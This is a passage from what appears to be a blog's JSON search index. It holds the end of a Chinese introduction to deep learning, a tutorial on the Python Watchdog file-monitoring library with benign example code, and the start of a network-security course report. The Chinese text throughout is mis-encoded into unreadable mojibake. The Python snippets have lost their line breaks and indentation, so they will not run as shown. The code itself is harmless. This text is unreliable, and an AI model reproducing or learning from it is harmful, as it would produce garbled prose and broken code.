å¯ä»¥çœ‹åˆ°ï¼Œå›¾ä¸­æœ‰ä¸€äº›ç™½ç‚¹å’Œä¸€äº›é»‘ç‚¹ã€‚å‡è®¾æˆ‘ä»¬æƒ³è¦å¼€å‘ä¸€ä¸ªç®—æ³•ï¼Œè¾“å…¥ä¸€ä¸ªç‚¹çš„åæ ‡(x, y)ï¼Œå°±èƒ½å¤Ÿåˆ¤æ–­è¿™ä¸ªç‚¹æ˜¯é»‘è‰²è¿˜æ˜¯ç™½è‰²ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š è¾“å…¥æ˜¯ç‚¹çš„åæ ‡ï¼› é¢„æœŸè¾“å‡ºæ˜¯ç‚¹çš„é¢œè‰²ï¼› è¡¡é‡ç®—æ³•æ•ˆæœå¥½åçš„ä¸€ç§æ–¹æ³•æ˜¯ï¼Œæ­£ç¡®åˆ†ç±»çš„ç‚¹æ‰€å çš„ç™¾åˆ†æ¯”ã€‚ è¿™é‡Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ä¸€ç§æ–°çš„æ•°æ®è¡¨ç¤ºï¼Œå¯ä»¥æ˜ç¡®åŒºåˆ†ç™½ç‚¹ä¸é»‘ç‚¹ã€‚å¯ç”¨çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œè¿™é‡Œç”¨çš„æ˜¯åæ ‡å˜æ¢ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚ &emsp;&emsp;åœ¨è¿™ä¸ªæ–°çš„åæ ‡ç³»ä¸­ï¼Œç‚¹çš„åæ ‡å¯ä»¥çœ‹ä½œæ•°æ®çš„ä¸€ç§æ–°çš„è¡¨ç¤ºã€‚è¿™ç§è¡¨ç¤ºå¾ˆæ£’ï¼åˆ©ç”¨è¿™ç§æ–°çš„è¡¨ç¤ºï¼Œç”¨ä¸€æ¡ç®€å•çš„è§„åˆ™å°±å¯ä»¥æè¿°é»‘/ç™½åˆ†ç±»é—®é¢˜ï¼šâ€œx&gt;0çš„æ˜¯é»‘ç‚¹â€æˆ–â€œx&lt;0çš„æ˜¯ç™½ç‚¹â€ã€‚è¿™ç§æ–°çš„è¡¨ç¤ºåŸºæœ¬ä¸Šè§£å†³äº†è¯¥åˆ†ç±»é—®é¢˜ã€‚ &emsp;&emsp;åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬äººä¸ºå®šä¹‰äº†åæ ‡å˜æ¢ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ç³»ç»Ÿæ€§åœ°æœç´¢å„ç§å¯èƒ½çš„åæ ‡å˜æ¢ï¼Œå¹¶ç”¨æ­£ç¡®åˆ†ç±»çš„ç‚¹æ‰€å ç™¾åˆ†æ¯”ä½œä¸ºåé¦ˆä¿¡å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬åšçš„å°±æ˜¯æœºå™¨å­¦ä¹ ã€‚æœºå™¨å­¦ä¹ ä¸­çš„å­¦ä¹ æŒ‡çš„æ˜¯ï¼Œå¯»æ‰¾æ›´å¥½æ•°æ®è¡¨ç¤ºçš„è‡ªåŠ¨æœç´¢è¿‡ç¨‹ã€‚ &emsp;&emsp;æ‰€æœ‰æœºå™¨å­¦ä¹ ç®—æ³•éƒ½åŒ…æ‹¬è‡ªåŠ¨å¯»æ‰¾è¿™æ ·ä¸€ç§å˜æ¢ï¼šè¿™ç§å˜æ¢å¯ä»¥æ ¹æ®ä»»åŠ¡å°†æ•°æ®è½¬åŒ–ä¸ºæ›´åŠ æœ‰ç”¨çš„è¡¨ç¤ºã€‚è¿™äº›æ“ä½œå¯èƒ½æ˜¯å‰é¢æåˆ°çš„åæ ‡å˜æ¢ï¼Œä¹Ÿå¯èƒ½æ˜¯çº¿æ€§æŠ•å½±ï¼ˆå¯èƒ½ä¼šç ´åä¿¡æ¯ï¼‰ã€å¹³ç§»ã€éçº¿æ€§æ“ä½œï¼ˆæ¯”å¦‚â€œé€‰æ‹©æ‰€æœ‰x&gt;0çš„ç‚¹â€ï¼‰ï¼Œç­‰ç­‰ã€‚æœºå™¨å­¦ä¹ ç®—æ³•åœ¨å¯»æ‰¾è¿™äº›å˜æ¢æ—¶é€šå¸¸æ²¡æœ‰ä»€ä¹ˆåˆ›é€ æ€§ï¼Œè€Œä»…ä»…æ˜¯éå†ä¸€ç»„é¢„å…ˆå®šä¹‰å¥½çš„æ“ä½œï¼Œè¿™ç»„æ“ä½œå«ä½œå‡è®¾ç©ºé—´ï¼ˆhypothesis spaceï¼‰ã€‚ &emsp;&emsp;è¿™å°±æ˜¯æœºå™¨å­¦ä¹ çš„æŠ€æœ¯å®šä¹‰ï¼šåœ¨é¢„å…ˆå®šä¹‰å¥½çš„å¯èƒ½æ€§ç©ºé—´ä¸­ï¼Œåˆ©ç”¨åé¦ˆä¿¡å·çš„æŒ‡å¼•æ¥å¯»æ‰¾è¾“å…¥æ•°æ®çš„æœ‰ç”¨è¡¨ç¤ºã€‚è¿™ä¸ªç®€å•çš„æƒ³æ³•å¯ä»¥è§£å†³ç›¸å½“å¤šçš„æ™ºèƒ½ä»»åŠ¡ï¼Œä»è¯­éŸ³è¯†åˆ«åˆ°è‡ªåŠ¨é©¾é©¶éƒ½èƒ½è§£å†³ã€‚ç°åœ¨ä½ ç†è§£äº†å­¦ä¹ çš„å«ä¹‰ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ·±åº¦å­¦ä¹ çš„ç‰¹æ®Šä¹‹å¤„ã€‚ 4ã€æ·±åº¦å­¦ä¹ ä¹‹â€œæ·±åº¦â€&emsp;&emsp;æ·±åº¦å­¦ä¹ æ˜¯æœºå™¨å­¦ä¹ çš„ä¸€ä¸ªåˆ†æ”¯é¢†åŸŸï¼šå®ƒæ˜¯ä»æ•°æ®ä¸­å­¦ä¹ è¡¨ç¤ºçš„ä¸€ç§æ–°æ–¹æ³•ï¼Œå¼ºè°ƒä»è¿ç»­çš„å±‚ï¼ˆlayerï¼‰ä¸­è¿›è¡Œå­¦ä¹ ï¼Œè¿™äº›å±‚å¯¹åº”äºè¶Šæ¥è¶Šæœ‰æ„ä¹‰çš„è¡¨ç¤ºã€‚â€œæ·±åº¦å­¦ä¹ â€ä¸­çš„â€œæ·±åº¦â€æŒ‡çš„å¹¶ä¸æ˜¯åˆ©ç”¨è¿™ç§æ–¹æ³•æ‰€è·å–çš„æ›´æ·±å±‚æ¬¡çš„ç†è§£ï¼Œè€Œæ˜¯æŒ‡ä¸€ç³»åˆ—è¿ç»­çš„è¡¨ç¤ºå±‚ã€‚æ•°æ®æ¨¡å‹ä¸­åŒ…å«å¤šå°‘å±‚ï¼Œè¿™è¢«ç§°ä¸ºæ¨¡å‹çš„æ·±åº¦ï¼ˆdepthï¼‰ã€‚è¿™ä¸€é¢†åŸŸçš„å…¶ä»–åç§°åŒ…æ‹¬åˆ†å±‚è¡¨ç¤ºå­¦ä¹ ï¼ˆlayered representationslearningï¼‰å’Œå±‚çº§è¡¨ç¤ºå­¦ä¹ ï¼ˆhierarchicalrepresentations learningï¼‰ã€‚ç°ä»£æ·±åº¦å­¦ä¹ é€šå¸¸åŒ…å«æ•°åä¸ªç”šè‡³ä¸Šç™¾ä¸ªè¿ç»­çš„è¡¨ç¤ºå±‚ï¼Œè¿™äº›è¡¨ç¤ºå±‚å…¨éƒ½æ˜¯ä»è®­ç»ƒæ•°æ®ä¸­è‡ªåŠ¨å­¦ä¹ çš„ã€‚ä¸æ­¤ç›¸åï¼Œå…¶ä»–æœºå™¨å­¦ä¹ æ–¹æ³•çš„é‡ç‚¹å¾€å¾€æ˜¯ä»…ä»…å­¦ä¹ ä¸€ä¸¤å±‚çš„æ•°æ®è¡¨ç¤ºï¼Œå› æ­¤æœ‰æ—¶ä¹Ÿè¢«ç§°ä¸ºæµ…å±‚å­¦ä¹ ï¼ˆshallowlearningï¼‰ã€‚ &emsp;&emsp;åœ¨æ·±åº¦å­¦ä¹ ä¸­ï¼Œè¿™äº›åˆ†å±‚è¡¨ç¤ºå‡ ä¹æ€»æ˜¯é€šè¿‡å«ä½œç¥ç»ç½‘ç»œï¼ˆneural networkï¼‰çš„æ¨¡å‹æ¥å­¦ä¹ å¾—åˆ°çš„ã€‚ç¥ç»ç½‘ç»œçš„ç»“æ„æ˜¯é€å±‚å †å ã€‚ç¥ç»ç½‘ç»œè¿™ä¸€æœ¯è¯­æ¥è‡ªäºç¥ç»ç”Ÿç‰©å­¦ï¼Œç„¶è€Œï¼Œè™½ç„¶æ·±åº¦å­¦ä¹ çš„ä¸€äº›æ ¸å¿ƒæ¦‚å¿µæ˜¯ä»äººä»¬å¯¹å¤§è„‘çš„ç†è§£ä¸­æ±²å–éƒ¨åˆ†çµæ„Ÿè€Œå½¢æˆçš„ï¼Œä½†æ·±åº¦å­¦ä¹ æ¨¡å‹ä¸æ˜¯å¤§è„‘æ¨¡å‹ã€‚æ²¡æœ‰è¯æ®è¡¨æ˜å¤§è„‘çš„å­¦ä¹ æœºåˆ¶ä¸ç°ä»£æ·±åº¦å­¦ä¹ æ¨¡å‹æ‰€ä½¿ç”¨çš„ç›¸åŒã€‚ä½ å¯èƒ½ä¼šè¯»åˆ°ä¸€äº›æµè¡Œç§‘å­¦çš„æ–‡ç« ï¼Œå®£ç§°æ·±åº¦å­¦ä¹ çš„å·¥ä½œåŸç†ä¸å¤§è„‘ç›¸ä¼¼æˆ–è€…æ˜¯æ ¹æ®å¤§è„‘çš„å·¥ä½œåŸç†è¿›è¡Œå»ºæ¨¡çš„ï¼Œä½†äº‹å®å¹¶éå¦‚æ­¤ã€‚å¯¹äºè¿™ä¸€é¢†åŸŸçš„æ–°äººæ¥è¯´ï¼Œå¦‚æœè®¤ä¸ºæ·±åº¦å­¦ä¹ ä¸ç¥ç»ç”Ÿç‰©å­¦å­˜åœ¨ä»»ä½•å…³ç³»ï¼Œé‚£å°†ä½¿äººå›°æƒ‘ï¼Œåªä¼šèµ·åˆ°åä½œç”¨ã€‚ä½ æ— é¡»é‚£ç§â€œå°±åƒæˆ‘ä»¬çš„å¤´è„‘ä¸€æ ·â€çš„ç¥ç§˜åŒ…è£…ï¼Œæœ€å¥½ä¹Ÿå¿˜æ‰è¯»è¿‡çš„æ·±åº¦å­¦ä¹ ä¸ç”Ÿç‰©å­¦ä¹‹é—´çš„å‡æƒ³è”ç³»ã€‚å°±æˆ‘ä»¬çš„ç›®çš„è€Œè¨€ï¼Œæ·±åº¦å­¦ä¹ æ˜¯ä»æ•°æ®ä¸­å­¦ä¹ è¡¨ç¤ºçš„ä¸€ç§æ•°å­¦æ¡†æ¶ã€‚ &emsp;&emsp;æ·±åº¦å­¦ä¹ ç®—æ³•å­¦åˆ°çš„è¡¨ç¤ºæ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå¤šå±‚ç½‘ç»œï¼ˆè§å›¾ï¼‰å¦‚ä½•å¯¹æ•°å­—å›¾åƒè¿›è¡Œå˜æ¢ï¼Œä»¥ä¾¿è¯†åˆ«å›¾åƒä¸­æ‰€åŒ…å«çš„æ•°å­—ã€‚ &emsp;&emsp;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™ä¸ªç½‘ç»œå°†æ•°å­—å›¾åƒè½¬æ¢æˆä¸åŸå§‹å›¾åƒå·®åˆ«è¶Šæ¥è¶Šå¤§çš„è¡¨ç¤ºï¼Œè€Œå…¶ä¸­å…³äºæœ€ç»ˆç»“æœçš„ä¿¡æ¯å´è¶Šæ¥è¶Šä¸°å¯Œã€‚ä½ å¯ä»¥å°†æ·±åº¦ç½‘ç»œçœ‹ä½œå¤šçº§ä¿¡æ¯è’¸é¦æ“ä½œï¼šä¿¡æ¯ç©¿è¿‡è¿ç»­çš„è¿‡æ»¤å™¨ï¼Œå…¶çº¯åº¦è¶Šæ¥è¶Šé«˜ï¼ˆå³å¯¹ä»»åŠ¡çš„å¸®åŠ©è¶Šæ¥è¶Šå¤§ï¼‰ã€‚ 5ã€ç”¨ä¸‰å¼ å›¾ç†è§£æ·±åº¦å­¦ä¹ çš„å·¥ä½œåŸç†&emsp;&emsp;ç°åœ¨ä½ å·²ç»çŸ¥é“ï¼Œæœºå™¨å­¦ä¹ æ˜¯å°†è¾“å…¥ï¼ˆæ¯”å¦‚å›¾åƒï¼‰æ˜ å°„åˆ°ç›®æ ‡ï¼ˆæ¯”å¦‚æ ‡ç­¾â€œçŒ«â€ï¼‰ï¼Œè¿™ä¸€è¿‡ç¨‹æ˜¯é€šè¿‡è§‚å¯Ÿè®¸å¤šè¾“å…¥å’Œç›®æ ‡çš„ç¤ºä¾‹æ¥å®Œæˆçš„ã€‚ä½ è¿˜çŸ¥é“ï¼Œæ·±åº¦ç¥ç»ç½‘ç»œé€šè¿‡ä¸€ç³»åˆ—ç®€å•çš„æ•°æ®å˜æ¢ï¼ˆå±‚ï¼‰æ¥å®ç°è¿™ç§è¾“å…¥åˆ°ç›®æ ‡çš„æ˜ å°„ï¼Œè€Œè¿™äº›æ•°æ®å˜æ¢éƒ½æ˜¯é€šè¿‡è§‚å¯Ÿç¤ºä¾‹å­¦ä¹ åˆ°çš„ã€‚ä¸‹é¢æ¥å…·ä½“çœ‹ä¸€ä¸‹è¿™ç§å­¦ä¹ è¿‡ç¨‹æ˜¯å¦‚ä½•å‘ç”Ÿçš„ã€‚ &emsp;&emsp;ç¥ç»ç½‘ç»œä¸­æ¯å±‚å¯¹è¾“å…¥æ•°æ®æ‰€åšçš„å…·ä½“æ“ä½œä¿å­˜åœ¨è¯¥å±‚çš„æƒé‡ï¼ˆweightï¼‰ä¸­ï¼Œå…¶æœ¬è´¨æ˜¯ä¸€ä¸²æ•°å­—ã€‚ç”¨æœ¯è¯­æ¥è¯´ï¼Œæ¯å±‚å®ç°çš„å˜æ¢ç”±å…¶æƒé‡æ¥å‚æ•°åŒ–ï¼ˆparameterizeï¼Œè§ä¸‹å›¾ï¼‰ã€‚æƒé‡æœ‰æ—¶ä¹Ÿè¢«ç§°ä¸ºè¯¥å±‚çš„å‚æ•°ï¼ˆparameterï¼‰ã€‚åœ¨è¿™ç§è¯­å¢ƒä¸‹ï¼Œå­¦ä¹ çš„æ„æ€æ˜¯ä¸ºç¥ç»ç½‘ç»œçš„æ‰€æœ‰å±‚æ‰¾åˆ°ä¸€ç»„æƒé‡å€¼ï¼Œä½¿å¾—è¯¥ç½‘ç»œèƒ½å¤Ÿå°†æ¯ä¸ªç¤ºä¾‹è¾“å…¥ä¸å…¶ç›®æ ‡æ­£ç¡®åœ°ä¸€ä¸€å¯¹åº”ã€‚ä½†é‡ç‚¹æ¥äº†ï¼šä¸€ä¸ªæ·±åº¦ç¥ç»ç½‘ç»œå¯èƒ½åŒ…å«æ•°åƒä¸‡ä¸ªå‚æ•°ã€‚æ‰¾åˆ°æ‰€æœ‰å‚æ•°çš„æ­£ç¡®å–å€¼å¯èƒ½æ˜¯ä¸€é¡¹éå¸¸è‰°å·¨çš„ä»»åŠ¡ï¼Œç‰¹åˆ«æ˜¯è€ƒè™‘åˆ°ä¿®æ”¹æŸä¸ªå‚æ•°å€¼å°†ä¼šå½±å“å…¶ä»–æ‰€æœ‰å‚æ•°çš„è¡Œä¸ºã€‚ &emsp;&emsp;æƒ³è¦æ§åˆ¶ä¸€ä»¶äº‹ç‰©ï¼Œé¦–å…ˆéœ€è¦èƒ½å¤Ÿè§‚å¯Ÿå®ƒã€‚æƒ³è¦æ§åˆ¶ç¥ç»ç½‘ç»œçš„è¾“å‡ºï¼Œå°±éœ€è¦èƒ½å¤Ÿè¡¡é‡è¯¥è¾“å‡ºä¸é¢„æœŸå€¼ä¹‹é—´çš„è·ç¦»ã€‚è¿™æ˜¯ç¥ç»ç½‘ç»œæŸå¤±å‡½æ•°ï¼ˆlossfunctionï¼‰çš„ä»»åŠ¡ï¼Œè¯¥å‡½æ•°ä¹Ÿå«ç›®æ ‡å‡½æ•°ï¼ˆobjective functionï¼‰ã€‚æŸå¤±å‡½æ•°çš„è¾“å…¥æ˜¯ç½‘ç»œé¢„æµ‹å€¼ä¸çœŸå®ç›®æ ‡å€¼ï¼ˆå³ä½ å¸Œæœ›ç½‘ç»œè¾“å‡ºçš„ç»“æœï¼‰ï¼Œç„¶åè®¡ç®—ä¸€ä¸ªè·ç¦»å€¼ï¼Œè¡¡é‡è¯¥ç½‘ç»œåœ¨è¿™ä¸ªç¤ºä¾‹ä¸Šçš„æ•ˆæœå¥½åï¼ˆè§å›¾ï¼‰ã€‚ &emsp;&emsp;æ·±åº¦å­¦ä¹ çš„åŸºæœ¬æŠ€å·§æ˜¯åˆ©ç”¨è¿™ä¸ªè·ç¦»å€¼ä½œä¸ºåé¦ˆä¿¡å·æ¥å¯¹æƒé‡å€¼è¿›è¡Œå¾®è°ƒï¼Œä»¥é™ä½å½“å‰ç¤ºä¾‹å¯¹åº”çš„æŸå¤±å€¼ï¼ˆè§ä¸‹å›¾ï¼‰ã€‚è¿™ç§è°ƒèŠ‚ç”±ä¼˜åŒ–å™¨ï¼ˆoptimizerï¼‰æ¥å®Œæˆï¼Œå®ƒå®ç°äº†æ‰€è°“çš„åå‘ä¼ æ’­ï¼ˆbackpropagationï¼‰ç®—æ³•ï¼Œè¿™æ˜¯æ·±åº¦å­¦ä¹ çš„æ ¸å¿ƒç®—æ³•ã€‚ä¸‹ä¸€ç« ä¸­ä¼šè¯¦ç»†åœ°è§£é‡Šåå‘ä¼ æ’­çš„å·¥ä½œåŸç†ã€‚ &emsp;&emsp;ä¸€å¼€å§‹å¯¹ç¥ç»ç½‘ç»œçš„æƒé‡éšæœºèµ‹å€¼ï¼Œå› æ­¤ç½‘ç»œåªæ˜¯å®ç°äº†ä¸€ç³»åˆ—éšæœºå˜æ¢ã€‚å…¶è¾“å‡ºç»“æœè‡ªç„¶ä¹Ÿå’Œç†æƒ³å€¼ç›¸å»ç”šè¿œï¼Œç›¸åº”åœ°ï¼ŒæŸå¤±å€¼ä¹Ÿå¾ˆé«˜ã€‚ä½†éšç€ç½‘ç»œå¤„ç†çš„ç¤ºä¾‹è¶Šæ¥è¶Šå¤šï¼Œæƒé‡å€¼ä¹Ÿåœ¨å‘æ­£ç¡®çš„æ–¹å‘é€æ­¥å¾®è°ƒï¼ŒæŸå¤±å€¼ä¹Ÿé€æ¸é™ä½ã€‚è¿™å°±æ˜¯è®­ç»ƒå¾ªç¯ï¼ˆtraining loopï¼‰ï¼Œå°†è¿™ç§å¾ªç¯é‡å¤è¶³å¤Ÿå¤šçš„æ¬¡æ•°ï¼ˆé€šå¸¸å¯¹æ•°åƒä¸ªç¤ºä¾‹è¿›è¡Œæ•°åæ¬¡è¿­ä»£ï¼‰ï¼Œå¾—åˆ°çš„æƒé‡å€¼å¯ä»¥ä½¿æŸå¤±å‡½æ•°æœ€å°ã€‚å…·æœ‰æœ€å°æŸå¤±çš„ç½‘ç»œï¼Œå…¶è¾“å‡ºå€¼ä¸ç›®æ ‡å€¼å°½å¯èƒ½åœ°æ¥è¿‘ï¼Œè¿™å°±æ˜¯è®­ç»ƒå¥½çš„ç½‘ç»œã€‚å†æ¬¡å¼ºè°ƒï¼Œè¿™æ˜¯ä¸€ä¸ªç®€å•çš„æœºåˆ¶ï¼Œä¸€æ—¦å…·æœ‰è¶³å¤Ÿå¤§çš„è§„æ¨¡ï¼Œå°†ä¼šäº§ç”Ÿé­”æ³•èˆ¬çš„æ•ˆæœã€‚","categories":[{"name":"æ·±åº¦å­¦ä¹ ","slug":"æ·±åº¦å­¦ä¹ ","permalink":"https://wolke.cn/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"æ·±åº¦å­¦ä¹ ","slug":"æ·±åº¦å­¦ä¹ ","permalink":"https://wolke.cn/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"author":"w01ke"},{"title":"ä½¿ç”¨Watchdogç›‘æ§æ–‡ä»¶","slug":"ä½¿ç”¨Watchdogç›‘æ§æ–‡ä»¶","date":"2022-01-14T06:26:42.000Z","updated":"2022-01-14T07:02:45.880Z","comments":true,"path":"post/8501a278.html","link":"","permalink":"https://wolke.cn/post/8501a278.html","excerpt":"","text":"å¥½ä¹…æ²¡æœ‰æ›´æ–°äº†ï¼Œæœ€è¿‘åˆšåˆ°å®¶ï¼Œè°ƒæ•´äº†ä¸‹çŠ¶æ€ç»§ç»­å­¦ä¹ æ›´æ–° ä¸€ã€ç®€ä»‹Watchdogæ˜¯ä¸€æ¬¾ç”¨äºç›‘æ§æ–‡ä»¶ç³»ç»Ÿäº‹ä»¶çš„Pythonåº“ï¼Œå¯¹ä¸åŒå¹³å°çš„äº‹ä»¶è¿›è¡Œäº†å°è£…ã€‚ Watchdogä¼˜å…ˆä½¿ç”¨åº•å±‚åŸç”ŸAPIï¼Œå…¶æ¬¡å†é€šè¿‡è½®è¯¢ç£ç›˜å®ç°ç›‘æ§ï¼Œç›®å‰æ”¯æŒä»¥ä¸‹æ“ä½œç³»ç»Ÿ Windowsï¼šReadDirectoryChangesW Linux 2.6+ï¼šinotify Mac OS Xï¼škqueue æˆ– FSEvents BSD Unix variantsï¼škqueue ä»…æ”¯æŒPython 3.5+ äºŒã€å®‰è£…WatchDogpip install watchdog ä¸‰ã€åˆè¯•import timefrom watchdog.observers import Observerfrom watchdog.events import FileSystemEventHandlerclass MyHandler(FileSystemEventHandler): def on_any_event(self, event): print(event.event_type, event.src_path)event_handler = MyHandler()observer = Observer()observer.schedule(event_handler, path=&#x27;.&#x27;, recursive=False)observer.start()try: while True: time.sleep(0.1)except KeyboardInterrupt: observer.stop()observer.join() æ•ˆæœï¼š created .\\a.txtmodified .\\a.txt~modified .\\a.txtmoved .\\a.txtdeleted .\\b.txt é€€å‡ºï¼šCtrl + C å››ã€é‡å®šå‘åˆ°æ—¥å¿—ä¸­è¾“å‡ºé‡å®šå‘åˆ°loggingæ—¥å¿—ä¸­ import sysimport timeimport loggingfrom watchdog.observers import Observerfrom watchdog.events import LoggingEventHandlerlogging.basicConfig(level=logging.INFO, format=&#x27;%(asctime)s - %(message)s&#x27;, datefmt=&#x27;%Y-%m-%d %H:%M:%S&#x27;)path = sys.argv[1] if len(sys.argv) &gt; 1 else r&#x27;D:\\ç›‘æ§æ–‡ä»¶å¤¹&#x27;event_handler = LoggingEventHandler()observer = Observer()observer.schedule(event_handler, path, recursive=True)observer.start()try: while True: time.sleep(0.1)finally: observer.stop() observer.join() äº”ã€Handlerç±»å‹ ç±»å‹ åŠŸèƒ½ FileSystemEventHandler æ–‡ä»¶ PatternMatchingEventHandle æ¨¡å¼åŒ¹é…æ–‡ä»¶ RegexMatchingEventHandler æ­£åˆ™åŒ¹é…æ–‡ä»¶ LoggingEventHandler è®°å½•æ—¥å¿— å…­ ã€WatchDogç›¸å…³ä»‹ç»1ã€Observerå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯¼å…¥ from watchdog.observers import Observer è¿™ä¸ªæ¨¡å—çš„ä½œç”¨ä¸»è¦æ˜¯å½“ä½œå¯åŠ¨å’Œå…³é—­ç›‘æ§ç¨‹åºçš„ï¼Œç»™äºˆæ–‡ä»¶å¤¹è·¯å¾„åï¼ŒObserverä¼šç›‘æ§æ–‡ä»¶å¤¹çš„å˜åŒ–å¹¶ä¸”åé¦ˆå˜åŒ–ã€‚ 2ã€eventså¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯¼å…¥ from watchdog.events import * &emsp;&emsp;è¿™æ˜¯watchdogçš„åŠ¨ä½œæ¨¡å—ï¼Œå…·ä½“ä½œç”¨æ˜¯æ ¹æ®Observeræ¨¡å—åé¦ˆçš„äº‹ä»¶åˆ†é…ä¸ä¸€æ ·çš„æ“ä½œåŠ¨ä½œæ–¹æ³•ï¼Œç„¶åç¨‹åºå†ç»§æ‰¿è¿™ä¸ªæ–¹æ³•å¼€å§‹æ‰§è¡Œæ‰€éœ€çš„ä»£ç ã€‚æœ‰çš„èŒæ–°ä¼šé—®ï¼Œä¸ºä»€ä¹ˆObserveråé¦ˆäº†äº‹ä»¶è¿˜éœ€è¦eventså»æ¥æ”¶å¤„ç†ï¼Œè¿˜å¾—å†å»ç»§æ‰¿eventså¤šéº»çƒ¦ã€‚å…·ä½“ä¸ºå•¥æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œåªæ˜¯å®˜æ–¹æŠŠObserveräº‹ä»¶åé¦ˆçš„ç»“æœä¼ ç»™eventsï¼Œeventsè¿›è¡Œåˆ†é…çš„ã€‚è§‰å¾—éº»çƒ¦çš„å¤§å“¥å¯ä»¥è‡ªå·±å†™æ¨¡å—æ¥å—Observerç»“æœå¹¶å¤„ç†ï¼ŒèŒæ–°çš„æˆ‘é€‰æ‹©ç›´æ¥ç»§æ‰¿å®˜æ–¹eventså®åˆ—ï¼Œåæ­£æ•ˆæœå·®ä¸å¤šã€‚ ä¸ƒã€è‡ªå®šä¹‰æ“ä½œåŠ¨ä½œfrom watchdog.observers import Observerfrom watchdog.events import *a = r&quot;D:\\ç›‘æ§æ–‡ä»¶å¤¹&quot;class MyHandler(FileSystemEventHandler): def on_modified(self, event): print(&quot;æ–‡ä»¶è¢«ä¿®æ”¹äº† %s &quot; % event.src_path) def on_created(self, event): print(&quot;æ–‡ä»¶è¢«åˆ›å»ºäº† %s&quot; % event.src_path)if __name__ == &quot;__main__&quot;: path = a event_handler = MyHandler() observer = Observer() observer.schedule(event_handler, path, recursive=True) observer.start() try: while True: time.sleep(1) except KeyboardInterrupt: observer.stop() observer.join() åœ¨ç›‘æ§ç›®å½•ä¸‹è¿›è¡Œæ–°å»ºæ–‡ä»¶å¤¹å’Œåˆ é™¤æ–‡ä»¶å¤¹æ“ä½œç»“æœï¼š æœ‰æ²¡æœ‰ä»”ç»†çœ‹æˆ‘å¯¹eventsæ¨¡å—å¯¼å…¥çš„æ˜¯ æ‰€æœ‰çš„ç±»ï¼Ÿå®é™…ä¸Šä½¿ç”¨çš„ä¸»è¦æ˜¯ï¼š FileSystemEventHandlerè¿™ä¸ªç±» ç‚¹å¼€eventsæ¨¡å—ï¼š ç±»æœ‰å¾ˆå¤šä¸ªï¼Œç®€å•ç”¨ä¸åˆ°å…¶ä»–ç±»çš„å¯ä»¥åªå¯¼å…¥è¿™ä¸€ä¸ªå°±è¡Œäº† ï¼Œè¿™ä¸ªç±»å®˜æ–¹æ˜¯å’‹å†™çš„å‘¢ï¼Ÿçœ‹ä¸‹å›¾ï¼š &emsp;&emsp;ä½ ä¼šå‘ç°é™¤äº† dispatch ä¸‹é¢æœ‰å†…å®¹ï¼Œè¿™ä¸ªç±»çš„å…¶ä»–æ–¹æ³•éƒ½æ˜¯ç©ºçš„ &emsp;&emsp;è¿™é‡Œdispatchå†³å®šäº†æ¥æ”¶åˆ°ObserveråŠ¨ä½œåè½¬å‘ç»™å“ªä¸ªæ–¹æ³•æ“ä½œï¼Œè€Œon_any_event å‘¢ä¼šé¦–å…ˆè¢«dispatchè°ƒç”¨ï¼Œä¹‹åæ‰ä¼šåˆ†é…ç»™å…¶ä»–çš„æ–¹æ³•ã€‚è¿™é‡Œçš„æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯ç©ºçš„ï¼Œç›®çš„å°±æ˜¯è®©æˆ‘ä»¬è‡ªè¡Œç»§æ‰¿è¿™ä¸ªç±»ç„¶åæ‰§è¡Œæˆ‘ä»¬è‡ªå·±çš„ä»£ç ã€‚ç”±äºå·²ç»æŠŠåŠ¨ä½œåˆ†é…å¥½äº†ï¼Œæ¯”å¦‚æˆ‘æ–°å»ºæ–‡ä»¶å¤¹ï¼Œåªä¼šè°ƒç”¨createï¼Œæˆ–è€…ç§»åŠ¨æ–‡ä»¶å¤¹åªä¼šè°ƒç”¨moveï¼Œæ‰€ä»¥æ ¹æ®ç›¸å…³åŠ¨ä½œç»§æ‰¿è¯¥æ–¹æ³•ååœ¨æ–¹æ³•é‡Œé¢å†™éœ€è¦æ‰§è¡Œçš„ä»£ç å³å¯å®ç°ç›‘æ§å’Œç›‘æ§æ“ä½œã€‚ å…«ã€è¯¾ç¨‹è®¾è®¡ç›¸å…³&emsp;&emsp;å‰å‡ å¤©ç½‘ç»œå®‰å…¨è¯¾ç¨‹è®¾è®¡ï¼Œæœ‰ä¸ªé€‰é¢˜å°±æ˜¯å…³äºæ–‡ä»¶ç›‘æ§ç›¸å…³çš„ï¼Œåœ¨è¿™é‡Œæˆ‘æŠŠæˆ‘çš„è¯¾ç¨‹è®¾è®¡æŠ¥å‘Šè´´å‡ºæ¥ 1ã€è¯¾ç¨‹è®¾è®¡ç›®çš„&emsp;&emsp;æœ¬è¯¾ç¨‹è®¾è®¡è¦æ±‚å­¦ç”Ÿåœ¨å·²æœ‰ç†è®ºå­¦ä¹ çš„åŸºç¡€ä¸Šï¼Œå…¨é¢æ¢³ç†æ‰€å­¦çš„è®¡ç®—æœºç½‘ç»œã€ç½‘ç»œå®‰å…¨ã€ç¨‹åºè®¾è®¡ç­‰ç›¸å…³çŸ¥è¯†ï¼Œè¿›ä¸€æ­¥æ·±å…¥ç†è§£ç½‘ç»œå®‰å…¨çš„å†…å®¹ï¼›äº†è§£å¸¸è§çš„ç½‘ç»œå®‰å…¨å·¥å…·ã€èµ„æºå’Œç›¸å…³æŠ€æœ¯ï¼ŒæŒæ¡ç½‘ç»œå®‰å…¨åº”ç”¨ç³»ç»Ÿåˆ†æã€è®¾è®¡ã€å®ç°å’Œæµ‹è¯•çš„æ–¹æ³•ã€‚ 